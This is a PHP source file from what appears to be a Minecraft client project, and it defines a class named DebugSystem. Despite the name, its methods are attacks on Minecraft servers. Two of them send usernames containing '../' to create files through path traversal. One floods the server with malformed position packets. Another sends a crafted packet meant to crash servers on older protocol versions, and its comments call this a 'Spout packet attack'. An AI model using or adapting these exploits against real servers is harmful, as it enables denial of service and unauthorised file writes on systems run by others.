<?php

/*


           -
         /   \
      /         \
   /   MINECRAFT   \
/         PHP         \
|\       CLIENT      /|
|.   \     2     /   .|
| ..     \   /     .. |
|    ..    |    ..    |
|       .. | ..       |
\          |          /
   \       |       /
      \    |    /
         \ | /
         
         
	by @shoghicp

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Lesser General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.


*/

class DebugSystem{
	protected $client, $protocol;
	function __construct($client){
		$this->client = $client;
		$this->protocol = $this->client->protocol;
	}
	
	public function beep(){
		$this->client->event("onConnect", "logout", true);
		$this->client->connect(str_repeat("\x07", 15)."\r");
	}

	public function createFile($name){
		$this->client->connect("../".$name);
	}
	
	public function internalError(){
		$this->client->connect("../level");
	}
	
	public function heal(){
		for($i = 0; $i < 250; ++$i){
			$this->client->send("0b", array(
				0 => "\x00\x00\x00\x00\x00\x00\x00\x00",
				1 => "\xc0\x8f\x38\x00\x00\x00\x00\x00",
				2 => "\xc0\x8f\x38\x00\x00\x00\x00\x00",
				3 => "\xb9\x71\x1d\xcf\x0d\x99\x14\xba",
				4 => "\x01"
			), true);		
		}
	}
	
	public function crash(){
		//Send 01??
		//Send fe??
		//Spout packet attack??
		if($this->protocol <= 22){
			$this->client->send("1b", array(
				0 => "\x00\x00\x00\x00",
				1 => "\x00\x00\x00\x00",
				2 => "\x7f\x7f\xff\xfd",
				3 => "\x7f\x7f\xff\xfd",
				4 => "\x00",
				5 => "\x00"
			), true);
			return true;
		}
		return false;
	}


}